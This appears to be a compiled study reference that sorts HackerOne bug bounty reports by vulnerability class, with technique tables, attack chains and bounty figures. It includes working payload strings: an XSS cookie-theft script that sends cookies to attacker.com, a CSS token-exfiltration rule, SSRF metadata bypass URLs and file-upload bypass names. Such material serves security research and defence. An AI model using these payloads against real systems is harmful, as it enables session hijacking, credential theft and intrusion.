# HackerOne Top Vulnerability Writeups — Deep-Read Reference

> Source: HackerOne's "Top Reports" / "Hacktivity" collections, curated by vulnerability class.
> Date compiled: 2026-06-06
> Total reports analyzed: ~4,500+ across 7 categories

---

## TABLE OF CONTENTS

1. [XSS (Cross-Site Scripting)](#1-xss-cross-site-scripting)
2. [RCE (Remote Code Execution)](#2-rce-remote-code-execution)
3. [SQLi (SQL Injection)](#3-sqli-sql-injection)
4. [SSRF (Server-Side Request Forgery)](#4-ssrf-server-side-request-forgery)
5. [IDOR (Insecure Direct Object Reference)](#5-idor-insecure-direct-object-reference)
6. [Account Takeover](#6-account-takeover)
7. [File Upload Attacks](#7-file-upload-attacks)
8. [Cross-Category Attack Chains](#8-cross-category-attack-chains)
9. [What Pays: Top Bounties by Class](#9-what-pays-top-bounties-by-class)

---

## 1. XSS (Cross-Site Scripting)

**Total entries: ~2,384 reports**
**Top bounty: $20,000 (PayPal)**

### 1.1 Core XSS Patterns

| Pattern | Description | Example Targets |
|---------|-------------|-----------------|
| **Stored XSS via cache poisoning** | Poison web cache to serve XSS payload to all visitors | PayPal signin page |
| **Reflected XSS in OAuth flow** | XSS in OAuth redirect_uri/login callbacks | LY Corporation, Slack |
| **Blind XSS on image upload** | Upload SVG/HTML as image, XSS fires in admin panel | CS Money |
| **DOM XSS in location hash** | JavaScript reads location.hash unsafely | Slack |
| **Stored XSS in Wiki/Markdown** | Markdown renderers don't sanitize HTML | GitLab |
| **XSS via file upload filename** | Unicode/HTML characters in filename trigger XSS | WordPress, Nextcloud |
| **XSS via postMessage** | Missing origin validation in postMessage handlers | Mail.ru, Shopify |
| **XSS via Angular Template Injection** | {{constructor}} style injections in AngularJS | Mail.ru, New Relic |
| **XSS via SVG upload** | SVG files allow <script> and <foreignObject> | Shopify, Moneybird |
| **XSS via CSS injection** | CSS can exfiltrate data (attribute selectors + URL) | Glassdoor |
| **XSS via email rendering** | HTML email with JS executed in webmail client | Mail.ru |
| **XSS via React element spoofing** | Crafted React props bypass sanitization | Imgur |
| **Second-order XSS** | Payload stored in one place, executed in another | Various |
| **Self-XSS escalation** | Self-XSS chained with CSRF/clickjacking to attack others | Cloudflare, various |

### 1.2 XSS Bypass Techniques

| Technique | How It Works |
|-----------|-------------|
| **CSP bypass** | Using JSONP endpoints, angular expressions, or CDN whitelist |
| **WAF bypass** | Unicode escapes, case variations, double encoding, null bytes |
| **HTML sanitizer bypass** | Mutation XSS (mXSS), namespace confusion, foreignObject in SVG |
| **DOMPurify bypass** | Prototype pollution, namespace confusion, emerging spec bypasses |
| **Akamai/Cloudflare WAF bypass** | SQLi+XSS combo, parameter pollution |
| **Content-Type sniffing** | Browsers interpret as HTML despite wrong Content-Type |
| **Flash-based XSS** | Vulnerable .swf files (ZeroClipboard, swfupload, player.swf) |
| **Cache poisoning for XSS** | Unkeyed inputs stored in cache, served to all users |
| **Open redirect to XSS** | javascript: URL in redirect parameter |
| **CRLF injection to XSS** | Splitting HTTP response headers to inject body |
| **CVE-based XSS** | CVE-2020-3580, CVE-2019-8331, CVE-2022-38463 |

### 1.3 XSS Payload Patterns Observed

```
- Standard: <script>alert(document.domain)</script>
- SVG: <svg/onload=alert(1)>
- IMG: <img src=x onerror=alert(1)>
- Angular: {{constructor.constructor('alert(1)')()}}
- postMessage: targetWindow.postMessage('{"key":"<img src=x onerror=...>"}', '*')
- CSS injection: input[name=csrf][value^="a"] { background: url(https://attacker/a) }
- Mutation XSS: <math><mtext><table><mglyph><style><!--</style><img src=x onerror=...>
- MIME sniffing: Upload HTML file as image/png, served inline
- Cookie theft: <script>new Image().src='//attacker.com/?c='+document.cookie</script>
- Dom clobbering: <a id=someConfig><a id=someConfig name=url href=javascript:alert(1)>
```

### 1.4 Top-Paying XSS Programs

| Company | Max Bounty |
|---------|-----------|
| PayPal | $20,000 |
| Shopify | $5,000 |
| Uber | $3,000 |
| Valve | $7,500 |
| GitLab | $20,000 |
| Slack | $500+ |
| Mail.ru | $2,000 |
| New Relic | $2,500 |
| Reddit | $5,000+ |
| Glassdoor | Bounty |

### 1.5 Unique XSS Chains Found

1. **Cache Poisoning → Stored XSS** (PayPal #488147): Poisoned cache served XSS to all visitors
2. **OAuth response_type switch → href leaking → XSS** (Reddit #1567186): Account hijack
3. **XSS → CSRF bypass → RCE** (Ubiquiti #289264): Trigger firmware changes
4. **Cookie Tossing + Anti-CSRF Token Prediction → Stored XSS** (Cloudflare #3321406)
5. **Open Redirect → Stored XSS → SSRF (Full Read)** (Grafana CVE-2025-4123)
6. **Web Cache Poisoning → XSS** (ok.ru #550266)
7. **CSRF → XSS** (U.S. Dept of Defense #1118521)
8. **XSSJacking/PasteJacking → XSS** (Zivver #893240)
9. **XSS → Arbitrary file read in Rocket.Chat Desktop** (#724153)
10. **Bypassing SOP with XSS → CSRF token theft** (Mail.ru #1215053)

### 1.6 Notable XSS Tools / Techniques Mentioned

- Swagger UI outdated instances (DOM XSS)
- Froala Editor CVE-2019-19935 (DOM XSS)
- MediaElement.js flash XSS
- JW Player SWF XSS
- plupload.flash.swf - SOME attack
- mailru.core.js eval-based XSS
- webpack-bundle-analyzer XSS
- mdBook XSS
- ImpressCMS/Rocket.Chat stored XSS
- RenderTron XSS (SSR service)

---

## 2. RCE (Remote Code Execution)

**Total entries: ~200+ reports**
**Top bounty: $30,000 (PayPal)**

### 2.1 RCE Technique Taxonomy

| Category | Sub-techniques |
|----------|---------------|
| **File Upload RCE** | Webshell upload, PHP file upload, logo upload, image with code, null byte extension bypass, .htaccess upload |
| **Deserialization RCE** | Java deserialization (WebLogic, Jenkins), Ruby Marshal.load, Python pickle, .NET BinaryFormatter, PHP unserialize |
| **Injection to RCE** | SQLi → xp_cmdshell, SSRF → FastCGI, Git flag injection, CRLF injection → git protocol, Kramdown options injection |
| **Dependency Confusion** | npm misconfig → install internal libs from public registry, Ruby gems, Python pip |
| **Server-Side Template Injection (SSTI)** | Jinja2, Freemarker, Velocity, ERB, Twig |
| **SSRF to RCE** | SSRF → internal services (Jenkins, FastCGI, Gopher), Cloud metadata → credential theft |
| **Buffer Overflow** | Steam client, native apps |
| **Prototype Pollution to RCE** | Kibana, Node.js apps |
| **ExifTool CVE** | CVE-2021-22204 - RCE when removing metadata (GitLab) |
| **ImageTragick** | ImageMagick delegate command injection |
| **FFmpeg** | HLS playlist processing → SSRF/LFI/RCE |

### 2.2 Detailed Exploitation Chains

1. **Buffer Overflow → RCE** (Valve/Steam #470520): Steam Client Server Info buffer overflow
2. **Pre-auth RCE on VPN** (Twitter/X #591295): $20,160 — Twitter VPN pre-auth RCE
3. **npm Dependency Confusion** (PayPal #925585): $30,000 — internal library names published to public npm
4. **Git Flag Injection → Local File Overwrite → RCE** (GitLab #658013): $12,000
5. **SQL Injection → RCE** (QIWI #816254): MSSQL xp_cmdshell via contactws
6. **XSS → Kick/Disconnect → RCE** (Valve #631956): Panorama UI XSS
7. **SSRF → FastCGI → RCE** (Mail.ru #1354335): POST /api/nr/video
8. **Cookie Deserialization → RCE** (GitLab): Rails session cookie deserialization
9. **Kramdown Options Injection → RCE** (GitLab #1125425): $20,000 — unsafe inline options
10. **DecompressedArchiveSizeValidator → RCE** (GitLab): Zip slip + symlink

### 2.3 Top-Paying RCE Programs

| Company | Max Bounty |
|---------|-----------|
| PayPal | $30,000 |
| X (Twitter) | $20,160 |
| GitLab | $20,000 |
| Shopify | $25,000+ |
| Basecamp | $5,000 |

### 2.4 Common Tools/Methods

- ysoserial (Java deserialization)
- PHPGGC (PHP gadget chains)
- ExifTool CVE-2021-22204
- ImageMagick delegates (ImageTragick)
- Git's --output flag injection
- npm/pip/gem dependency confusion
- FFmpeg HLS + SSRF
- FastCGI direct connect
- Jenkins Groovy script console via SSRF

---

## 3. SQLi (SQL Injection)

**Total entries: ~307 reports**
**Top bounty: $25,000 (Valve)**

### 3.1 SQL Injection Types

| Type | Frequency | Example |
|------|-----------|---------|
| **Time-based blind** | Very common | `sleep(5)`, `pg_sleep(5)`, `WAITFOR DELAY` |
| **Boolean-based blind** | Common | `AND 1=1` vs `AND 1=2` |
| **Error-based** | Common | Extract data from error messages |
| **UNION-based** | Common | `UNION SELECT` data extraction |
| **Stacked queries** | Less common | Multiple statements in one call |
| **Out-of-band (OOB)** | Rare | DNS/HTTP exfiltration |

### 3.2 SQLi Injection Points

| Injection Location | Examples |
|-------------------|----------|
| **GET/POST parameters** | Standard query params |
| **URL path** | `/users/1' OR '1'='1` |
| **HTTP headers** | User-Agent, Cookie, Referer |
| **GraphQL arguments** | Embedded in GraphQL queries |
| **JSON fields** | JSONField KeyTransform in Django |
| **ORM filter parameters** | FilteredRelation, Q objects |
| **CSV/mport functionality** | Import files |
| **File upload metadata** | EXIF/Comment fields |
| **Search autocomplete** | Query suggestion endpoints |

### 3.3 SQLi to RCE Chains (Critical Pattern)

1. **SQLi → xp_cmdshell** (QIWI #816254, #816086, #816560): MSSQL stacked queries
2. **SQLi → UTL_HTTP** (Oracle): SSRF from within database
3. **SQLi → LOAD_FILE/INTO OUTFILE** (MySQL): File read/write
4. **SQLi → COPY ... FROM PROGRAM** (PostgreSQL): Command execution
5. **SQLi → Insecure Deserialization → RCE** (Krisp #1842674, Liberapay #361341)
6. **NoSQL Injection → RCE** (Rocket.Chat #1130721): Pre-auth blind NoSQLi

### 3.4 WAF/Signature Bypass Techniques

- **AWS WAF SQLi detection bypass** (AWS VDP #3591725)
- Comment injection: `/**/`, `/*!*/`
- Case variation: `SeLeCt`, `UnIoN`
- Whitespace: tabs, newlines
- Encoding: URL double encoding, hex, char()
- Parameter pollution
- Equivalent functions: `SLEEP()` vs `pg_sleep()` vs `WAITFOR DELAY`

### 3.5 Notable Database Targets

- **MySQL/MariaDB**: Most common
- **PostgreSQL**: GitLab, Django apps
- **MSSQL**: QIWI, corporate targets
- **Oracle**: Informatica
- **ClickHouse**: Mail.ru (#1024773, $5,000)
- **MongoDB**: NoSQL injection (Rocket.Chat)
- **SQLite**: Local/embedded databases

### 3.6 Top-Paying SQLi Programs

| Company | Max Bounty |
|---------|-----------|
| Valve | $25,000 |
| Mail.ru | $15,000 |
| Razer | $4,000 |
| Uber | $4,000 |
| Eternal (Zomato) | $4,500 |
| Mozilla | Bounty |
| InnoGames | $2,000 |
| Django (IBB) | $4,263 |

---

## 4. SSRF (Server-Side Request Forgery)

**Total entries: ~311 reports**
**Top bounty: $17,576 (Dropbox)**

### 4.1 SSRF Impact Escalation

| Impact | Description |
|--------|-------------|
| **AWS/Cloud metadata access** | IMDSv1: http://169.254.169.254/latest/meta-data/ |
| **Internal service discovery** | Port scanning, service enumeration |
| **Cloud creds theft** | IAM credentials from metadata → account takeover |
| **RCE via internal services** | FastCGI, Jenkins, Redis, Memcached, Gopher |
| **LFI via SSRF** | file://, gopher:// protocols |
| **Local file read** | SSRF to localhost file servers |

### 4.2 SSRF Entry Points

| Entry Point | Examples |
|-------------|----------|
| **Image/URL fetch** | Upload from URL, avatar by URL, image proxy |
| **Webhooks** | Custom webhook URLs, integration callbacks |
| **File import** | Import from URL (Git, CSV, project import) |
| **PDF/Report generation** | HTML-to-PDF, screenshot services |
| **OAuth flows** | Jira integration, social login |
| **API integrations** | Slack commands, Google Drive, video processing |
| **Video/FFmpeg processing** | HLS playlist URLs, thumbnail generation |
| **URL preview/link unfurling** | Slack, social media link previews |
| **IPFS/Git protocol** | Unsanitized IPFS CIDs, git:// URLs |
| **Sentry/Analytics** | Misconfigured Sentry DSN, analytics beacons |
| **DNS rebinding** | DNS pin middleware bypass, Burp Suite MCP |

### 4.3 SSRF Bypass Techniques

| Technique | Details |
|-----------|---------|
| **DNS rebinding** | TTL=0 DNS that resolves to internal IP on second query |
| **Redirect bypass** | 301/302 to internal IP (bypass URL allowlist) |
| **IPv6 encoding** | `http://[::ffff:169.254.169.254]/` |
| **NAT64 prefix** | `64:ff9b::1` → maps to IPv4 |
| **Decimal/octal IP** | `http://2852039166/` = 169.254.169.254 |
| **URL parser confusion** | `http://evil.com@127.0.0.1/`, `http://127.0.0.1#@evil.com/` |
| **DNS pinning bypass** | Trailing dot: `http://google.com.127.0.0.1.xip.io/` |
| **Double brackets** | Stripe Smokescreen bypass with `[[url]]` |
| **CRLF injection** | Inject headers via newlines in URL |
| **Unicode homoglyphs** | Cyrillic 'о' instead of Latin 'o' |
| **Shortened URLs** | bit.ly, tinyurl that redirect to internal |

### 4.4 Key SSRF Chains

1. **SSRF → AWS metadata → IAM credentials → Account takeover** (Multiple)
2. **SSRF → FastCGI → RCE** (Mail.ru #1354335)
3. **SSRF → Internal Jolokia → RCE** (Aiven #1547877, $5,000)
4. **SSRF → Exchange → ROOT access** (Shopify #341876)
5. **XXE via SVG → SSRF** (Zivver #897244)
6. **Open Redirect → Stored XSS → SSRF** (Grafana CVE-2025-4123)
7. **SMB SSRF → NTLM hash leak → credential theft** (Rockstar Games #288353)
8. **CRLF injection + SSRF → RCE** (GitLab #441090)
9. **HTTP Request Smuggling + SSRF** (curl #3484431)

### 4.5 Top-Paying SSRF Programs

| Company | Max Bounty |
|---------|-----------|
| Dropbox | $17,576 |
| GitLab | $10,000 |
| Reddit | $6,000 |
| EXNESS | $3,000 |
| Aiven | $5,000 |
| IBM | $0 (VDP) |
| PlayStation | $1,000 |
| Mail.ru | $2,500 |
| Shopify | $500 |
| HackerOne | $3,500 |
| PortSwigger | $2,000 |
| Kubernetes | $5,000 |

---

## 5. IDOR (Insecure Direct Object Reference)

**Total entries: ~253 reports**
**Top bounty: $12,500 (HackerOne)**

### 5.1 IDOR Impact Categories

| Impact | Description |
|--------|-------------|
| **PII leak** | View other users' personal information |
| **Account takeover** | Change email/phone to take over account |
| **Delete/modify data** | Delete licenses, campaigns, photos, videos |
| **Financial fraud** | Use others' credit cards, view payments |
| **Privilege escalation** | Add secondary users, change roles |
| **Data scraping** | Enumerate and extract all user data |

### 5.2 IDOR Parameter Patterns

| Parameter Type | Examples |
|---------------|----------|
| **Numeric IDs** | `user_id=123`, `order_id=456` |
| **UUIDs** | Predictable or leaked UUIDs |
| **GraphQL object IDs** | Base64 encoded IDs |
| **Email addresses** | Using victim's email as identifier |
| **File/resource IDs** | `attachment_id`, `document_id`, `photo_id` |
| **Session/Token binding** | Missing ownership check on token operations |

### 5.3 IDOR Bypass Techniques

| Technique | Example |
|-----------|---------|
| **HTTP method change** | POST → PUT, GET → POST to bypass checks |
| **Array parameter wrapping** | `user_id[]=victim_id` |
| **IDOR in GraphQL** | Cross-tenant queries via mutations |
| **Race condition** | TOCTOU in ownership checks |
| **UUID prediction** | Time-based or sequential UUIDs |
| **Missing auth on internal APIs** | Internal microservices lacking auth checks |
| **Cross-repository IDOR** | GitHub #3560256 — cross-repo bypass reviewer modification |

### 5.4 IDOR-to-ATO Chains

1. **IDOR edit email → Account Takeover** (CrowdSignal #915114, Atavist #950881)
2. **IDOR + Password reset → Mass ATO** (U.S. DoD #685338)
3. **IDOR + API token leak → ATO** (Automattic #1695454)
4. **Singapore - IDOR → Account Takeover** (Starbucks #876300)

### 5.5 Top-Paying IDOR Programs

| Company | Max Bounty |
|---------|-----------|
| HackerOne | $12,500 |
| PayPal | $10,500 |
| Shopify | $5,000 |
| Reddit | $5,000 |
| Mail.ru | $3,000 |
| Unikrn | $3,000 |
| TikTok | $2,500 |
| Nord Security | Bounty |
| Pornhub | $1,500 |
| New Relic | $2,500 |
| GitHub | Bounty ($1,160) |

---

## 6. Account Takeover

**Total entries: ~234 reports**
**Top bounty: $35,000 (GitLab)**

### 6.1 ATO Technique Taxonomy

| Category | Sub-techniques |
|----------|---------------|
| **Password Reset Abuse** | Token leakage, weak token generation, no expiry, host header injection |
| **Session Theft** | XSS → cookie steal, HTTP request smuggling, cache deception |
| **OAuth Misconfig** | Insufficient redirect_uri validation, state parameter bypass, PKCE bypass |
| **CSRF to ATO** | CSRF on email change, password change, account linking |
| **IDOR to ATO** | Change victim's email, phone, or password via IDOR |
| **JWT Attacks** | Weak signing, alg:none, key confusion, expired token reuse |
| **SAML/OIDC Attacks** | XML signature wrapping, assertion replay, RelayState injection |
| **SSRF to ATO** | Cloud metadata → credentials, SSRF in Autodesk rendering |
| **Rate Limiting Bypass** | SMS brute force, password brute force, 2FA bypass |
| **Cache Poisoning to ATO** | Cache deception, poisoned auth pages |
| **DNS/HTTP Smuggling** | Request smuggling for session theft (Slack #737140) |

### 6.2 Key Exploitation Chains

1. **Password Reset without user interaction** (GitLab #2293343): $35,000
2. **Session cookie leak → ATO** (HackerOne #745324): $20,000
3. **HTTP Request Smuggling → Session theft → Mass ATO** (Slack #737140)
4. **OAuth callback bypass → ATO** (X #129873, #110293)
5. **AWS Cognito misconfig → ATO** (Flickr #1342088)
6. **Open Redirect → XSS → ATO** (Yelp #2010530)
7. **CSRF + XSS → ATO** (Mail.ru #1081148)
8. **SSRF → Account takeover** (Autodesk #3024673)
9. **Spring Actuator → ATO** (LY Corporation #862589, $5,000)
10. **Sign with Apple flow bypass → ATO** (Glassdoor #1639802)

### 6.3 OAuth/SAML Specific Attacks

- **Null byte %00 in state parameter** (Logitech #1046630)
- **response_type switch** (Reddit #1567186)
- **redirect_uri validation bypass** (X/Twitter #129873)
- **Missing PKCE validation** (Grammarly #824931)
- **RelayState URL validation bypass** (GitLab #1923672)
- **Insufficient OIDC state filtering** (Tools for Humanity #2515808)

### 6.4 Top-Paying ATO Programs

| Company | Max Bounty |
|---------|-----------|
| GitLab | $35,000 |
| HackerOne | $20,000 |
| TikTok | $12,000 |
| Stripe | $10,500 |
| Uber | $10,000 |
| Superhuman/Grammarly | $10,500 |
| Chaturbate | $8,000 |
| Mail.ru | $3,000 |
| Shopify | $800 |
| Valve | $2,500 |
| New Relic | $2,048 |

---

## 7. File Upload Attacks

**Total entries: ~154 reports**
**Top bounty: $5,000 (Aiven)**

### 7.1 Upload Attack Vectors

| Vector | Description |
|--------|-------------|
| **Webshell upload** | Upload .php/.jsp/.asp file directly |
| **Extension bypass** | .php5, .phtml, .php., .pHp, double extension (.php.jpg) |
| **Null byte truncation** | filename.php%00.jpg (bypass extension check) |
| **Content-Type spoofing** | Send PHP as image/jpeg |
| **Image with embedded code** | Polyglot files (valid image + PHP) |
| **.htaccess upload** | Upload .htaccess to enable PHP in upload dir |
| **SVG-based attacks** | SVG → XSS, SVG → XXE, SVG → SSRF |
| **Archive/zip slip** | Path traversal in extracted archives |
| **TOCTOU race** | Race between upload and validation |
| **CSV/XML injection** | Formulas/entities in uploaded data |
| **S3 bucket upload** | Public writable S3 buckets |

### 7.2 File Upload to RCE Chains

1. **Logo upload → RCE** (Semrush #403417): Unrestricted file upload
2. **Webshell via file upload** (Starbucks #506646): ecjobs.starbucks.com.cn
3. **Admin default password → Image Upload Backdoor/Shell** (Razer #699030)
4. **TinyMCE upload bypass → RCE** (8x8 #778629)
5. **Null byte truncated extension → RCE** (U.S. DoD #2054184)
6. **File upload + SQLite JDBC driver → RCE via SSRF** (Aiven #1547877): $5,000
7. **SFTP TOCTOU race condition** (curl #3432833)

### 7.3 File Upload to XSS Chains

1. **Blind XSS on image upload** (CS Money #1010466): $1,000
2. **SVG upload → Stored XSS** (Multiple: Shopify, Nextcloud, Moneybird)
3. **Unicode characters in filename → XSS** (WordPress #179695)
4. **HTML file upload → Stored XSS** (Visma Public #808862, #808821)
5. **File upload with CSP bypass** (Rocket.Chat #1380157)

### 7.4 Upload Bypass Techniques

- **Double extension**: `shell.php.jpg`
- **Null byte**: `shell.php%00.jpg`
- **MIME type spoofing**: Change Content-Type header
- **Magic bytes**: Add GIF89a/JFIF header to PHP file
- **Case bypass**: `.PhP`, `.pHp5`
- **Windows ADS**: `filename.php::$DATA`
- **Apache override**: Upload `.htaccess` with `AddType application/x-httpd-php .jpg`
- **config file**: Upload `web.config` or `.user.ini`

### 7.5 Top-Paying File Upload Programs

| Company | Max Bounty |
|---------|-----------|
| Aiven | $5,000 |
| Mail.ru | $3,000 |
| TikTok | $2,727 |
| Pornhub | $1,500 |
| Mozilla | $1,000 |
| CS Money | $1,000 |
| Visma Public | $250 |
| Razer | $200 |
| GitHub Security Lab | $500 |

---

## 8. Cross-Category Attack Chains

These are the most valuable exploitation patterns found across all categories:

### 8.1 The "God Chain" Patterns

```
Pattern 1: File Upload → XSS → Session Theft → Account Takeover
Pattern 2: SSRF → Cloud Metadata → Credential Theft → Full Cloud Compromise
Pattern 3: SQLi → Code Execution (xp_cmdshell) → Server Takeover
Pattern 4: IDOR → Email Change → Password Reset → Account Takeover
Pattern 5: Cache Poisoning → Stored XSS → Mass Victim Impact
Pattern 6: Dependency Confusion → Package Install → RCE
Pattern 7: SSRF → Internal Service (Jenkins/FastCGI) → RCE
Pattern 8: XSS → CSRF Token Theft → State-Changing Operations
Pattern 9: Open Redirect → OAuth Token Theft → Account Takeover
Pattern 10: XSS → postMessage abuse → Cross-origin data theft
```

### 8.2 Most Common Chained Vulnerabilities

| Primary Vuln | Secondary Vuln | Final Impact | Frequency |
|-------------|---------------|--------------|-----------|
| SSRF | Cloud Metadata Access | Credential Theft | Very High |
| XSS | Session/Cookie Theft | Account Takeover | Very High |
| IDOR | Email/Phone Change | Account Takeover | High |
| SQLi | Out-of-band/Stacked | RCE | Medium |
| File Upload | XSS via SVG/HTML | Session Theft | Medium |
| Open Redirect | OAuth Token Theft | Account Takeover | Medium |
| CSRF | XSS (via injected content) | Account Takeover | Medium |
| Cache Poisoning | Stored XSS | Mass Impact | Low-Medium |
| XXE | SSRF | Internal Access | Medium |
| SSRF | FastCGI/Gopher | RCE | Low |

---

## 9. What Pays: Top Bounties by Class

### 9.1 Highest Single Bounties

| Bounty | Class | Company | Report |
|--------|-------|---------|--------|
| $35,000 | ATO | GitLab | Password Reset without user interaction |
| $30,000 | RCE | PayPal | npm Dependency Confusion |
| $25,000 | SQLi | Valve | SQL Injection in report_xml.php |
| $20,000 | RCE | GitLab | ExifTool / Kramdown RCE |
| $20,160 | RCE | X/Twitter | Pre-auth RCE on VPN |
| $20,000 | XSS | PayPal | Stored XSS bypass |
| $18,900 | XSS | PayPal | Cache poisoning XSS |
| $17,576 | SSRF | Dropbox | Full Response SSRF via Google Drive |
| $15,000 | SQLi | Mail.ru | Time-based SQLi on city-mobil.ru |
| $12,500 | IDOR | HackerOne | Delete licenses/certifications |
| $12,000 | RCE | GitLab | Git flag injection |
| $12,000 | ATO | TikTok | Auth bypass in account recovery |
| $10,500 | IDOR | PayPal | Add secondary users |
| $10,500 | ATO | Grammarly | DOS SSO + account takeover |
| $10,000 | SSRF | GitLab | SSRF on project import |
| $10,000 | ATO | Uber | Password reset token leaking |

### 9.2 Companies with Highest Total Payouts (from these collections)

1. **GitLab**: Multiple $12K-$35K bounties across RCE, SSRF, ATO, XSS
2. **PayPal**: $10K-$30K across XSS, IDOR, RCE
3. **Shopify**: $500-$25K+ across XSS, SSRF, RCE, IDOR
4. **Mail.ru**: $150-$15K across SQLi, XSS, SSRF, ATO
5. **Uber**: $1.5K-$10K across SQLi, XSS, ATO, SSRF
6. **HackerOne**: $2.5K-$20K across ATO, SSRF, IDOR
7. **Valve**: $2.5K-$25K across SQLi, XSS, RCE
8. **Stripe**: Up to $10.5K (ATO)
9. **Dropbox**: $500-$17.5K (SSRF, XSS)
10. **TikTok**: $200-$12K (XSS, ATO, IDOR, Upload)

### 9.3 What Doesn't Pay (from $0 bounties)

Many reports to these companies had $0 bounties despite high upvotes:
- U.S. Dept of Defense (VDP, no monetary rewards)
- Starbucks (mixed, some $0)
- QIWI (many $0)
- MTN Group (many $0)
- HackerOne (self-hosted, mixed)
- Automattic (mixed)
- Some Mail.ru subdomains

### 9.4 Bounty-to-Upvote Correlation

High upvotes + high bounty = highest value vulnerabilities:
- Account Takeover (avg upvote: 200-400, avg bounty: $5K-$15K)
- RCE (avg upvote: 400-1,200, avg bounty: $12K-$30K)
- SSRF with cloud impact (avg upvote: 200-650, avg bounty: $2K-$18K)
- XSS with account takeover impact (avg upvote: 300-2,600, avg bounty: $10K-$20K)

---

## APPENDIX: Tools & Methodology Mentioned Across Reports

### Recon Tools
- Burp Suite (including Burp Collaborator)
- ffuf / dirbuster / gobuster
- Subfinder / Amass
- Shodan / Censys
- Wayback Machine / gau / waybackurls
- httpx / httprobe

### Exploitation Tools
- sqlmap (SQLi automation)
- ysoserial / PHPGGC (deserialization)
- ngrok / burp collaborator (OOB testing)
- ExifTool (metadata inspection/exploitation)
- ImageMagick (ImageTragick exploitation)
- Gopherus (SSRF to gopher protocol)
- nuclei (template-based vulnerability scanning)

### Specialized Techniques
- DNS rebinding (using rbndr.us or custom tools)
- HTTP request smuggling (CL.TE, TE.CL variants)
- Race condition exploitation (Turbo Intruder, single-packet attack)
- Web cache poisoning/deception (param miner)
- Prototype pollution (client-side and server-side)
- Dependency confusion (npm/pip/gem name squatting)
- JWT analysis (jwt_tool, jwt.io)
- GraphQL introspection and batching attacks

---

*End of Reference Document*
*Generated from: h1-TOPXSS.md, h1-TOPRCE.md, h1-TOPSQLI.md, h1-TOPSSRF.md, h1-TOPIDOR.md, h1-TOPACCOUNTTAKEOVER.md, h1-TOPUPLOAD.md*
